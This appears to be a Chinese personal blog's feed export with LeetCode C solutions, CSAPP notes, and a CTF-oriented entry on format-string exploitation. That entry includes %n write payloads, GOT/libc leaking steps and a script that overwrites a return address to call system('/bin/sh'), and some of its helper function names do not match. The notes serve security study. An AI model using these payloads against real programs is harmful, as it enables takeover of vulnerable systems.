class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路2：</strong>已知两数组长度，求中位数只要知道中间位置的数不一定要将数组合并</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">double findMedianSortedArrays(int* nums1, int nums1Size, int* nums2, int nums2Size) &#123;    int size &#x3D; nums1Size + nums2Size;    int i &#x3D; 0, j &#x3D; 0, count &#x3D; 0;    int res1 &#x3D; 0, res2 &#x3D; 0;    while (i &lt; nums1Size || j &lt; nums2Size) &#123;        if (j &#x3D;&#x3D; nums2Size || (i &lt; nums1Size &amp;&amp; nums1[i] &lt; nums2[j])) &#123;            count++;            if (count &#x3D;&#x3D; size &#x2F; 2) &#123;                res1 &#x3D; nums1[i];            &#125;            if (count &#x3D;&#x3D; size &#x2F; 2 + 1) &#123;                res2 &#x3D; nums1[i];                break;            &#125;            i++;        &#125; else &#123;            count++;            if (count &#x3D;&#x3D; size &#x2F; 2) &#123;                res1 &#x3D; nums2[j];            &#125;            if (count &#x3D;&#x3D; size &#x2F; 2 + 1) &#123;                res2 &#x3D; nums2[j];                break;            &#125;            j++;        &#125;    &#125;    if (size % 2 &#x3D;&#x3D; 1) &#123;        return res2;    &#125; else &#123;        return (res1 + res2) &#x2F; 2.0;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>思路3：</strong>中位数查找算法</p><ol><li>使用二分搜索找到一个划分点将两个数组分成左右两部分，使得左边部分的所有元素都小于右边部分的元素。</li><li>根据划分后两个部分的长度，判断是否找到了中位数。如果总长度为奇数，则中位数就是划分点左边部分的最大元素；如果总长度为偶数，则中位数是划分点左右两边部分的最大元素和最小元素的平均值。</li><li>如果划分点左边部分的最大元素大于右边部分的最小元素，则需要调整划分点，继续进行二分搜索。</li></ol><pre class="line-numbers language-C" data-language="C"><code class="language-C">double findMedianSortedArrays(int* nums1, int nums1Size, int* nums2, int nums2Size)&#123;    if(nums1Size &gt; nums2Size)     &#123;         return findMedianSortedArrays(nums2, nums2Size, nums1, nums1Size);    &#125; &#x2F;&#x2F;首先要满足第一个数组小于第二个数组    int total &#x3D; nums1Size + nums2Size; &#x2F;&#x2F;总计的数字，用于计算    int left &#x3D; 0, right &#x3D; nums1Size;     while(left &lt;&#x3D; right)     &#123;         int i &#x3D; (left+right)&#x2F;2; &#x2F;&#x2F;i为第一个数组线左边的数量        int j &#x3D; (total + 1) &#x2F; 2 - i;  &#x2F;&#x2F;j为第二个数组线左边的数量，使用total计算，如果total为奇数，线就偏向右边，如果偶数，分割线左右两边相等        if(i &lt; nums1Size &amp;&amp; nums2[j-1] &gt; nums1[i]) &#x2F;&#x2F;nums2[j-1] &gt; nums1[i]表示线要右移，如果i&#x3D;&#x3D;nums1Size那么就不用右移了        &#123;             left &#x3D; i + 1;         &#125;         else if(i &gt; 0 &amp;&amp; nums1[i-1] &gt; nums2[j]) &#x2F;&#x2F;nums1[i-1] &gt; nums2[j]表示线要左移，如果i&#x3D;&#x3D;0，就不用左移了        &#123;             right &#x3D; i - 1;         &#125;         else         &#123;             int max_left &#x3D; 0; &#x2F;&#x2F;以下对分割线左右四个元素操作            if(i &#x3D;&#x3D; 0) &#x2F;&#x2F;如果数组一分割线左边为0个，左边最大就是数组二分割线左边第一个            &#123;                 max_left &#x3D; nums2[j-1];             &#125; else if(j &#x3D;&#x3D; 0) &#x2F;&#x2F;如果数组二分割线左边为0个，左边最大就是数组一分割线左边第一个            &#123;                 max_left &#x3D; nums1[i-1];             &#125; else   &#x2F;&#x2F;否则就判断分割线左边两个的最大值            &#123;                 max_left &#x3D; fmax(nums1[i-1], nums2[j-1]);             &#125;             if(total % 2 &#x3D;&#x3D; 1) &#x2F;&#x2F;如果是奇数，就返回左边最大值，因为线是偏右边的            &#123;                 return max_left;             &#125;             int min_right &#x3D; 0;             if(i &#x3D;&#x3D; nums1Size) &#x2F;&#x2F;找右边最大值，偶数取左右两边最大值的平均数            &#123;                 min_right &#x3D; nums2[j];            &#125;             else if(j &#x3D;&#x3D; nums2Size)             &#123;                min_right &#x3D; nums1[i];             &#125;             else             &#123;                 min_right &#x3D; fmin(nums1[i], nums2[j]);             &#125;             return (max_left + min_right) &#x2F; 2.0;         &#125;     &#125;     return 0; &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="最长回文子串"><a href="#最长回文子串" class="headerlink" title="最长回文子串"></a><a href="https://leetcode.cn/problems/longest-palindromic-substring/description/">最长回文子串</a></h2><p>题目描述：给你一个字符串 <code>s</code>，找到 <code>s</code> 中最长的回文子串。如果字符串的反序与原始字符串相同，则该字符串称为回文字符串。</p><p>思路：遍历所有的两个字符和三个字符的子串，记录符合回文子串的左右两边下标，遍历这个数组中的左右下标，并且通过while循环找出两边第一个不相同的位置，得到以该位置为中心的回文子串长度，记录最大长度并返回</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">longestPalindrome</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> s<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> left<span class="token punctuation">[</span><span class="token number">2005</span><span class="token punctuation">]</span><span class="token punctuation">,</span> right<span class="token punctuation">[</span><span class="token number">2005</span><span class="token punctuation">]</span><span class="token punctuation">,</span> length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">,</span> index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> max <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> resl <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span><span class="token operator">*</span> res <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//find index</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            left<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>            right<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&lt;</span> length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            left<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>            right<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> j <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>            index<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        j<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">//enlarge</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i <span class="token operator">&lt;</span> index<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> right<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> length <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> s<span class="token punctuation">[</span>left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>right<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>            right<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">!=</span> s<span class="token punctuation">[</span>right<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            right<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span>right<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> left<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">></span> max<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            max <span class="token operator">=</span> right<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> left<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>            resl <span class="token operator">=</span> left<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//return string</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">||</span> index <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        res<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> max<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            res<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>resl <span class="token operator">+</span> i<span class="token punctuation">]</span><span class="token punctuation">;</span>            res<span class="token punctuation">[</span>max<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《格式化字符串》</title>
      <link href="/2023/06/20/ge-shi-hua-zi-fu-chuan/ge-shi-hua-zi-fu-chuan/"/>
      <url>/2023/06/20/ge-shi-hua-zi-fu-chuan/ge-shi-hua-zi-fu-chuan/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h1><h2 id="基本格式"><a href="#基本格式" class="headerlink" title="基本格式"></a>基本格式</h2><pre class="line-numbers language-none"><code class="language-none">%[parameter][flags][field width][.precision][length]type<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用以<code>%</code>开头的格式说明符占位，在后面参数列表中提供相应变量</li><li><code>c</code>，把 int 参数转为 unsigned char 型输出</li><li><code>p</code>， void * 型，printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址</li><li><code>n</code>，不输出字符，将该字符之前的字符数量写入参数中</li></ul><h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><p>利用格式化字符串漏洞，我们还可以获取我们所想要输出的内容。一般会有如下几种操作</p><ul><li>泄露栈内存<ul><li>获取某个变量的值</li><li>获取某个变量对应地址的内存</li></ul></li><li>泄露任意地址内存<ul><li>利用 <code>GOT</code> 表得到 <code>libc</code> 函数地址，进而获取 <code>libc</code>，进而获取其它 <code>libc</code> 函数地址</li><li>盲打，<code>dump</code> 整个程序，获取有用信息。</li></ul></li></ul><h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>payload：<code>‘%’ + str(target_addr) + &#39;c%offset$n&#39;</code></p><ul><li><code>hhn</code>:1字节（2位</li><li><code>hn</code>：2字节（4位</li><li><code>n</code>：4字节（8位</li></ul><h3 id="栈上的格式化字符串"><a href="#栈上的格式化字符串" class="headerlink" title="栈上的格式化字符串"></a>栈上的格式化字符串</h3><h4 id="确定偏移offset"><a href="#确定偏移offset" class="headerlink" title="确定偏移offset"></a>确定偏移offset</h4><p>在<code>printf</code>下断点，利用<code>fmtarg</code>工具获取偏移</p><h4 id="修改内存函数基本构造"><a href="#修改内存函数基本构造" class="headerlink" title="修改内存函数基本构造"></a>修改内存函数基本构造</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt1</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span>    <span class="token keyword">return</span> fmtstr<span class="token keyword">def</span> <span class="token function">fmt2</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    prev <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> fmt_str<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">0x0804A028</span><span class="token punctuation">,</span><span class="token number">0x12345678</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>32位时自带函数：<code>fmtstr_payload(偏移，&#123;被改的got：要改的plt&#125;)</code></p><h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><ul><li>泄露libc等所需地址</li><li>将需要修改的地址写入栈</li><li>获取写入</li></ul><h3 id="非栈上格式化字符串漏洞"><a href="#非栈上格式化字符串漏洞" class="headerlink" title="非栈上格式化字符串漏洞"></a>非栈上格式化字符串漏洞</h3><p>技巧：1.改<code>ret</code>地址中的<code>libc_start_main</code>为<code>ogg</code></p><p>​          2.改<code>printf_got</code>为<code>system/ogg</code></p><p>​          3.泄露<code>stack</code>地址的时候如果<code>ebp</code>地址不对就用和<code>ebp</code>连接的地址一样的地址</p><pre class="line-numbers language-none"><code class="language-none">sys1 &#x3D; system &amp; 0xff #取低字节sys2 &#x3D; (system&gt;&gt;8) &amp; 0xffff #取第二三字节 gift_addr &#x3D; gift &amp; 0xffff #取低二字节p4 &#x3D; &#39;%&#39; + str(sys1) + &#39;c%8$hhn&#39; + &#39;%&#39; + str((gift_addr) - (sys1)) + &#39;c%9$hn&#39; + &#39;%&#39; + str(sys2-gift_addr) + &#39;c%10$hn&#39; r.sendlineafter(&#39;gift for you: \n&#39;,p4)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若需分两次改则需要两条链，当第二次发送的数据小于第一次发送的数据时，要加<code>0x10000</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#简单的格式化字符串利用函数，将dest地址的后8字节循环更改成ptr对应的字节，off1与off2为上述（1）与（2）两个栈地址在格式化字符串中的偏移</span><span class="token keyword">def</span> <span class="token function">overlap</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span>off1<span class="token punctuation">,</span>off2<span class="token punctuation">)</span><span class="token punctuation">:</span>    d<span class="token operator">=</span>dest<span class="token operator">&amp;</span><span class="token number">0xff</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> ptr<span class="token punctuation">:</span>            <span class="token keyword">break</span>        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off1<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>        f<span class="token operator">=</span>ptr<span class="token operator">&amp;</span><span class="token number">0xff</span>        payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>off2<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hhn'</span>        p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>        d<span class="token operator">+=</span><span class="token number">1</span>        ptr<span class="token operator">>></span><span class="token operator">=</span><span class="token number">8</span>ret<span class="token operator">=</span>rsp<span class="token operator">+</span><span class="token number">0x18</span>ptr<span class="token operator">=</span>libc<span class="token punctuation">.</span>address<span class="token operator">+</span><span class="token number">0x21112</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#通过将第25个参数传入格式化字符串，将第39个参数的值改为返回地址</span>payload<span class="token operator">=</span><span class="token string">b'%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>ret<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'c%'</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'$hn'</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#覆盖返回地址为ptr（pop_rdi; ret）</span>overlap<span class="token punctuation">(</span>ret<span class="token punctuation">,</span>ptr<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token comment">#覆盖返回地址+8的位置为binsh字符串地址</span>overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token comment">#覆盖返回地址+16的位置为system函数的地址</span>overlap<span class="token punctuation">(</span>ret<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">.</span>system<span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">)</span><span class="token comment">#至此，退出循环执行ROP后即可获取系统操作权限</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'food: '</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>泄露<code>libc</code>：<code>__libc_start_main</code></p></li><li><p>修改：<code>payload = (b&#39;%&#39; + bytes(str(one1), encoding=&#39;utf-8&#39;) + b&#39;c%8$hn&#39;).ljust(16, b&#39;a&#39;) + p64(exit_addr)</code>，分多次修改每次<code>sleep(0.5)</code></p></li><li><pre><code class="python">num = 12345num_bytes = num.to_bytes(2, byteorder=&#39;little&#39;)#转换为字节序列</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《CSAPP》阅读笔记（持续更新）</title>
      <link href="/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/"/>
      <url>/2023/05/04/cs-app-yue-du-bi-ji-chi-xu-geng-xin/cs-app-yue-du-bi-ji-chi-xu-geng-xin/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章-计算机系统漫游"><a href="#第一章-计算机系统漫游" class="headerlink" title="第一章 计算机系统漫游"></a>第一章 计算机系统漫游</h1><h2 id="信息就是位-上下文"><a href="#信息就是位-上下文" class="headerlink" title="信息就是位+上下文"></a>信息就是位+上下文</h2><p><strong>源程序</strong>：由值为<strong>0和1</strong>组成的<strong>位（比特）序列</strong></p><p><strong>.c文件</strong>：以<code>ASCII</code>字符组成的文本文件，以<strong>字节序列</strong>的方式储存在文件中，每个文本行以<code>\n</code>结尾，对应数字<code>10</code></p><p><strong>字节</strong>：<strong>八个位</strong>被组成的一组称为字节</p><p><strong>二进制文件</strong>：除了只由<code>ASCII</code>码组成的<strong>文本文件</strong>，其他都是二进制文件，系统中的所有<strong>信息</strong>都是由一串<strong>比特</strong>表示</p><p><strong>区分不同数据对象的唯一方法</strong>：数据对象的<strong>上下文</strong></p><p><strong>相关组织</strong>： <code>ANSI</code>  美国国家标准学会      <code>ISO</code>  国际标准化组织</p><h2 id="程序被其他程序翻译成不同的格式"><a href="#程序被其他程序翻译成不同的格式" class="headerlink" title="程序被其他程序翻译成不同的格式"></a>程序被其他程序翻译成不同的格式</h2><p><strong>二进制磁盘文件</strong>：<strong>机器语言指令</strong>按照<strong>可执行目标程序</strong>的格式打包好之后以<strong>二进制磁盘文件</strong>的形式存放</p><p><strong>目标程序</strong>：也称为<strong>可执行目标文件</strong>，或<strong>可执行文件</strong>，可以被加载到<strong>内存</strong>中，由<strong>系统</strong>执行</p><p><strong>编译器驱动程序</strong>：用于将<strong>源文件</strong>转化为<strong>目标文件</strong></p><p><strong>编译系统</strong>：预处理器 + 编译器 + 汇编器 + 链接器</p><p><strong>将源程序转化为目标文件的四个阶段</strong></p><table><thead><tr><th>阶段</th><th>工具</th><th>结果</th><th>扩展名</th><th>文件性质</th></tr></thead><tbody><tr><td>预处理阶段</td><td>预处理器 